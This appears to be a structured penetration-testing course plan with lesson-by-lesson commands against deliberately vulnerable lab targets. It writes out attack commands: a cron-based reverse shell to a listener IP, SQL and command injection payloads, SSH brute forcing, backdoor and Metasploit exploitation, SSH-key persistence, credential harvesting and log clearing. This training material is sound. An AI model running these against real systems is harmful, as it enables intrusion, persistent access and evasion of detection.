# Cybersecurity Learning Plan

## Prerequisites

### Hardware Requirements
- Mac with VMware Fusion OR Windows/Linux with VMware Workstation Player
- 8GB RAM minimum

### Software Setup
**Option A: VMware Lab (Recommended)**
- VMware Fusion (Mac) or VMware Workstation Player (free)
- Kali Linux VM (attacker machine)
- Target VMs (various vulnerable systems)

**Option B: Mac Terminal Alternative**
- Homebrew package manager
- Docker Desktop
- Security tools via brew/pip3

## Attack Methodology Framework

### **Information Gathering**
**Objective:** Collect data about target systems and networks
**Techniques:**
- Passive reconnaissance (OSINT)
- Active reconnaissance (network scanning)
- Service enumeration
- Technology fingerprinting

### **Scanning & Enumeration**
**Objective:** Identify live hosts, open ports, and running services
**Techniques:**
- Network discovery
- Port scanning (TCP/UDP)
- Service version detection
- Operating system fingerprinting

### **Vulnerability Assessment**
**Objective:** Identify security weaknesses in discovered services
**Techniques:**
- Automated vulnerability scanning
- Manual testing for common vulnerabilities
- Configuration analysis
- Default credential testing

### **Exploitation**
**Objective:** Leverage vulnerabilities to gain unauthorized access
**Techniques:**
- Manual exploitation
- Automated exploitation frameworks
- Custom exploit development
- Web application attacks

### **Post-Exploitation**
**Objective:** Maintain access and escalate privileges
**Techniques:**
- System enumeration
- Privilege escalation
- Persistence mechanisms
- Lateral movement

## Vulnerable Target Categories

### **BEGINNER TARGETS**
**Web Applications**
- DVWA (Damn Vulnerable Web App) - Docker/VM
- WebGoat (OWASP) - Java-based web app
- Mutillidae II - PHP web application
- bWAPP - Buggy web application

**Network Services**
- Metasploitable2 - Linux with 20+ vulnerable services
- Metasploitable3 - Windows/Linux hybrid
- VulnOS - Operating system vulnerabilities

### **INTERMEDIATE TARGETS**
**Mixed Environments**
- HackLAB: Vulnix - Privilege escalation focus
- Kioptrix series (1-5) - Progressive difficulty
- PwnLab - Multi-stage exploitation
- Mr. Robot VM - CTF-style challenges

**Specialized Focus**
- WebSecurity Dojo - Web application security
- DVRF - Router firmware vulnerabilities
- IoTGoat - IoT device security

### **ADVANCED TARGETS**
**Enterprise Simulation**
- VulnHub: Enterprise - Corporate network simulation
- Active Directory Labs - Domain environments
- Red Team Labs - Advanced persistent threats
- GOAD (Game of Active Directory) - Complex AD scenarios

**CTF-Style Challenges**
- OverTheWire - Command line challenges
- PicoCTF offline - Competition-style problems
- VulnHub: Boot2Root - Complete system compromise

## Learning Path Structure

### **PHASE 1: INFORMATION GATHERING**

#### Lesson 1: Environment Setup
**Objective:** Build isolated lab environment
**Skills:** VM configuration, network isolation, tool installation

**Basic Terminal Commands:**
```bash
# Check your current network configuration
ifconfig                        # Display network interfaces
ip addr show                    # Alternative network interface display
ip route show                   # Show routing table

# Test network connectivity
ping -c 3 8.8.8.8              # Test internet connectivity (-c limits to 3 packets)
ping -c 3 192.168.1.1          # Test gateway connectivity
```

#### Lesson 2: Network Discovery
**Objective:** Identify live systems and open ports
**Skills:** Host discovery, port scanning, service detection
**Target:** Local network range

**Basic Terminal Commands:**
```bash
# Discover live hosts on network
nmap -sn 192.168.1.0/24        # Ping sweep to find live hosts (-sn = no port scan)
nmap -sn 10.0.0.0/24           # Alternative network range

# Basic port scanning
nmap 192.168.1.100             # Default scan of most common 1000 ports
nmap -p 1-1000 192.168.1.100   # Scan specific port range (-p specifies ports)
nmap -p- 192.168.1.100         # Scan all 65535 ports (- means all)
```

#### Lesson 3: Service Enumeration
**Objective:** Gather detailed service information
**Skills:** Banner grabbing, version detection, script scanning
**Target:** DVWA container

**Basic Terminal Commands:**
```bash
# Service version detection
nmap -sV 192.168.1.100         # Detect service versions (-sV = version detection)
nmap -sC 192.168.1.100         # Run default NSE scripts (-sC = default scripts)
nmap -sV -sC 192.168.1.100     # Combine version detection and scripts

# Manual banner grabbing
nc 192.168.1.100 22            # Connect to SSH port (netcat for raw connection)
nc 192.168.1.100 80            # Connect to HTTP port
telnet 192.168.1.100 25        # Connect to SMTP port using telnet

# HTTP enumeration
curl -I http://192.168.1.100   # Get HTTP headers only (-I = head request)
curl -v http://192.168.1.100   # Verbose output showing full request/response
```

### **PHASE 2: SCANNING & ENUMERATION**

#### Lesson 4: Advanced Port Scanning
**Objective:** Master different scanning techniques
**Skills:** TCP/UDP scanning, stealth scanning, OS detection

**Basic Terminal Commands:**
```bash
# Different scan types
nmap -sS 192.168.1.100         # SYN scan (stealth, doesn't complete connection)
nmap -sT 192.168.1.100         # TCP connect scan (completes full connection)
nmap -sU 192.168.1.100         # UDP scan (scans UDP ports)
nmap -sF 192.168.1.100         # FIN scan (sends FIN packets)

# OS detection and aggressive scanning
nmap -O 192.168.1.100          # Operating system detection
nmap -A 192.168.1.100          # Aggressive scan (OS, version, scripts, traceroute)

# Timing and stealth
nmap -T4 192.168.1.100         # Timing template (T0=slowest, T5=fastest)
nmap -f 192.168.1.100          # Fragment packets to evade firewalls
```

#### Lesson 5: Web Application Enumeration
**Objective:** Discover web application structure and content
**Skills:** Directory enumeration, technology detection
**Target:** DVWA or WebGoat

**Basic Terminal Commands:**
```bash
# Directory enumeration
dirb http://192.168.1.100      # Basic directory brute force
dirb http://192.168.1.100 /usr/share/dirb/wordlists/common.txt  # Custom wordlist

# Web vulnerability scanning
nikto -h http://192.168.1.100  # Comprehensive web vulnerability scanner
nikto -h http://192.168.1.100 -p 8080  # Scan specific port

# Manual web enumeration
curl http://192.168.1.100/robots.txt     # Check robots.txt file
curl http://192.168.1.100/sitemap.xml    # Check sitemap
curl -s http://192.168.1.100 | grep -i "server\|version\|powered"  # Technology detection
```

### **PHASE 3: VULNERABILITY ASSESSMENT**

#### Lesson 6: Automated Vulnerability Scanning
**Objective:** Use automated tools to identify vulnerabilities
**Skills:** NSE scripts, vulnerability databases, configuration testing

**Basic Terminal Commands:**
```bash
# Nmap vulnerability scripts
nmap --script vuln 192.168.1.100                    # Run all vulnerability scripts
nmap --script "vuln and safe" 192.168.1.100         # Only safe vulnerability scripts
nmap --script smb-vuln* 192.168.1.100               # SMB-specific vulnerability scripts

# Specific vulnerability checks
nmap --script ssl-cert,ssl-enum-ciphers 192.168.1.100  # SSL/TLS analysis
nmap --script http-sql-injection 192.168.1.100         # SQL injection detection
nmap --script ftp-anon 192.168.1.100                   # Anonymous FTP access

# Script information and usage
nmap --script-help vuln                             # Get help for vulnerability scripts
nmap --script-updatedb                              # Update NSE script database
```

#### Lesson 7: Manual Vulnerability Testing
**Objective:** Manually test for common vulnerabilities
**Skills:** Default credentials, configuration issues, manual testing

**Basic Terminal Commands:**
```bash
# FTP testing
ftp 192.168.1.100              # Connect to FTP service
# Try: anonymous/anonymous, ftp/ftp, admin/admin

# SSH brute force (educational purposes only)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100  # Multiple users/passwords

# SMB enumeration
smbclient -L 192.168.1.100     # List SMB shares
smbclient //192.168.1.100/share  # Connect to specific share
enum4linux 192.168.1.100      # Comprehensive SMB enumeration

# SNMP enumeration
snmpwalk -c public -v1 192.168.1.100  # SNMP walk with community string "public"
onesixtyone -c community.txt 192.168.1.100  # SNMP community string brute force
```

### **PHASE 4: EXPLOITATION**

#### Lesson 8: Web Application Exploitation
**Objective:** Exploit common web vulnerabilities
**Skills:** SQL injection, XSS, command injection
**Target:** DVWA (low security mode)

**Basic Terminal Commands:**
```bash
# SQL injection testing
sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=value; security=low"
sqlmap -u "http://192.168.1.100/login.php" --data="username=admin&password=pass" --dbs

# Manual SQL injection
curl "http://192.168.1.100/vulnerable.php?id=1' OR 1=1--"
curl "http://192.168.1.100/vulnerable.php?id=1' UNION SELECT 1,user(),version()--"

# Command injection testing
curl "http://192.168.1.100/command.php" --data "ip=127.0.0.1; whoami"
curl "http://192.168.1.100/command.php" --data "ip=127.0.0.1 && cat /etc/passwd"
```

#### Lesson 9: Network Service Exploitation
**Objective:** Exploit network services and protocols
**Skills:** Service-specific attacks, manual exploitation
**Target:** Metasploitable2

**Basic Terminal Commands:**
```bash
# FTP exploitation (if backdoor exists)
nc 192.168.1.100 21            # Connect to FTP
# Send: USER test:)             # Trigger backdoor
nc 192.168.1.100 6200          # Connect to backdoor port

# Telnet exploitation
telnet 192.168.1.100 23        # Direct telnet connection
# Try common credentials: admin/admin, root/root

# SSH exploitation
ssh admin@192.168.1.100        # Try SSH with weak credentials
ssh -o PreferredAuthentications=password admin@192.168.1.100  # Force password auth

# SMB exploitation
smbget -R smb://192.168.1.100/share  # Download entire SMB share
mount -t cifs //192.168.1.100/share /mnt/smb  # Mount SMB share
```

#### Lesson 10: Metasploit Framework
**Objective:** Use automated exploitation framework
**Skills:** Module selection, payload configuration, session management
**Target:** Metasploitable2 services

**Basic Terminal Commands:**
```bash
# Start Metasploit
msfconsole                     # Start Metasploit console
msfdb init                     # Initialize Metasploit database

# Basic Metasploit commands
search vsftpd                  # Search for exploits
search type:exploit platform:linux  # Search with filters
use exploit/unix/ftp/vsftpd_234_backdoor  # Select exploit module

# Configure and run exploit
show options                   # Show required options
set RHOSTS 192.168.1.100      # Set target IP
set LHOST 192.168.1.50        # Set local IP for reverse connection
exploit                       # Run the exploit
run                           # Alternative to exploit command

# Session management
sessions -l                    # List active sessions
sessions -i 1                  # Interact with session 1
background                     # Background current session
```

### **PHASE 5: POST-EXPLOITATION**

#### Lesson 11: System Enumeration
**Objective:** Gather information after gaining access
**Skills:** User enumeration, system information, privilege assessment

**Basic Terminal Commands:**
```bash
# User and privilege information
whoami                         # Current username
id                            # User ID and group memberships
groups                        # Group memberships
sudo -l                       # Check sudo permissions

# System information
uname -a                      # System information (kernel, architecture)
cat /etc/issue                # Distribution information
cat /etc/passwd               # User accounts
cat /etc/group                # Group information
cat /etc/shadow               # Password hashes (if readable)

# Network information
ifconfig                      # Network interfaces
netstat -tuln                 # Listening ports and connections
ss -tuln                      # Modern alternative to netstat
arp -a                        # ARP table (other hosts)
route -n                      # Routing table
```

#### Lesson 12: Privilege Escalation
**Objective:** Gain higher system privileges
**Skills:** SUID binaries, kernel exploits, configuration weaknesses

**Basic Terminal Commands:**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null    # Find SUID files
find / -perm -2000 -type f 2>/dev/null    # Find SGID files
find / -perm -u=s -type f 2>/dev/null     # Alternative SUID search

# Check for writable files and directories
find / -writable -type f 2>/dev/null      # Writable files
find / -writable -type d 2>/dev/null      # Writable directories
find /etc -writable 2>/dev/null           # Writable files in /etc

# Check running processes and services
ps aux                        # All running processes
ps -ef                        # Alternative process listing
systemctl list-units --type=service  # Running services (systemd)
service --status-all          # Running services (SysV init)

# Check for interesting files
find / -name "*.conf" 2>/dev/null     # Configuration files
find / -name "*password*" 2>/dev/null  # Files with "password" in name
find / -name "*.log" 2>/dev/null      # Log files
```

#### Lesson 13: Persistence and Lateral Movement
**Objective:** Maintain access and move to other systems
**Skills:** Backdoor creation, credential harvesting, network enumeration

**Basic Terminal Commands:**
```bash
# Create persistence mechanisms
crontab -e                    # Edit cron jobs for persistence
echo "* * * * * /bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" | crontab  # Cron reverse shell

# SSH key persistence
mkdir ~/.ssh                  # Create SSH directory
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys  # Add your public key
chmod 600 ~/.ssh/authorized_keys  # Set proper permissions

# Network discovery for lateral movement
nmap -sn 192.168.1.0/24      # Discover other hosts on network
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; done  # Ping sweep

# Credential harvesting
cat /home/*/.bash_history     # Check bash history for credentials
grep -r "password" /home/ 2>/dev/null  # Search for password strings
cat /etc/passwd | cut -d: -f1  # List all users
```

### **PHASE 6: ADVANCED TECHNIQUES**

#### Lesson 14: Custom Tool Development
**Objective:** Build custom security tools and scripts
**Skills:** Python scripting, automation, payload generation

**Basic Terminal Commands:**
```bash
# Python environment setup
python3 --version             # Check Python version
pip3 install requests         # Install HTTP library
pip3 install python-nmap     # Install nmap Python wrapper

# Create simple port scanner
cat > port_scanner.py << 'EOF'
#!/usr/bin/env python3
import socket
import sys

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

host = sys.argv[1]
for port in range(1, 1001):
    if scan_port(host, port):
        print(f"Port {port} is open")
EOF

chmod +x port_scanner.py      # Make executable
python3 port_scanner.py 192.168.1.100  # Run scanner
```

#### Lesson 15: Log Analysis and Evasion
**Objective:** Understand logging and stealth techniques
**Skills:** Log analysis, traffic manipulation, evasion techniques

**Basic Terminal Commands:**
```bash
# Log file locations
tail -f /var/log/auth.log     # Monitor authentication logs
tail -f /var/log/apache2/access.log  # Monitor web server logs
journalctl -f                 # Monitor systemd logs

# Clear logs (for educational purposes)
> /var/log/auth.log           # Clear authentication log
history -c                    # Clear bash history
unset HISTFILE               # Disable history logging

# Traffic manipulation
nmap -D 192.168.1.10,192.168.1.20 192.168.1.100  # Decoy scan
nmap --source-port 53 192.168.1.100  # Source port manipulation
nmap -f 192.168.1.100        # Fragment packets
```

#### Lesson 16: Complete Penetration Test
**Objective:** Execute full penetration testing methodology
**Skills:** Complete attack chain, documentation, reporting

**Basic Terminal Commands:**
```bash
# Automated reconnaissance
nmap -sS -O -sV --script discovery 192.168.1.0/24 -oA full_scan
nikto -h http://192.168.1.100 -output nikto_results.txt

# Exploitation tracking
script exploitation_log.txt   # Record terminal session
# Perform all exploitation steps
exit                          # Stop recording

# Evidence collection
mkdir evidence                # Create evidence directory
cp screenshots/* evidence/   # Copy screenshots
cp *.txt evidence/           # Copy text outputs
tar -czf evidence.tar.gz evidence/  # Archive evidence
```

## Target Downloads and Setup

### Essential Targets
- **Metasploitable2:** https://sourceforge.net/projects/metasploitable/
- **VulnHub:** https://www.vulnhub.com/
- **DVWA:** `docker run -d -p 80:80 vulnerables/web-dvwa`
- **WebGoat:** `docker run -d -p 8080:8080 webgoat/webgoat-8.0`

### Tool Installation (Mac)
```bash
# Install Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install security tools
brew install nmap nikto dirb sqlmap john-jumbo hashcat
pip3 install impacket requests beautifulsoup4
```

## Documentation Standards
- Document all commands executed with timestamps
- Screenshot successful exploits and findings
- Maintain detailed notes of vulnerabilities discovered
- Create proof-of-concept scripts for custom exploits
- Record network topology and system information